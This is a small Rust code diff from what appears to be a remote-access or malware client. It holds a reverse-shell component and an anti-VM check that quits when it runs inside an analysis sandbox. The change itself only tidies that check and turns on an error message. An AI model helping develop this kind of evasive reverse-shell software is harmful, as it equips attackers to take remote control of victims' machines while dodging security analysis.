@@ -32,10 +32,8 @@ static REVERSE_SHELL: Lazy<Mutex<features::reverse_shell::ReverseShell>> = Lazy:
 async fn main() {
     let config = service::config::get_config();
 
-    if config.anti_vm_detection {
-        if service::anti_vm::anti_vm_detection() {
-            std::process::exit(0);
-        }
+    if config.anti_vm_detection && service::anti_vm::anti_vm_detection() {
+        std::process::exit(0);
     }
 
     unsafe {
@@ -102,8 +100,8 @@ async fn main() {
                 ).await;
                 
                 // Wait for writer to complete
-                if let Err(_) = write_task.await {
-                    // println!("Write task error: {}", e);
+                if let Err(e) = write_task.await {
+                    println!("Write task error: {}", e);
                 }
                 
                 // println!("Connection ended. Reconnecting in 5 seconds...");
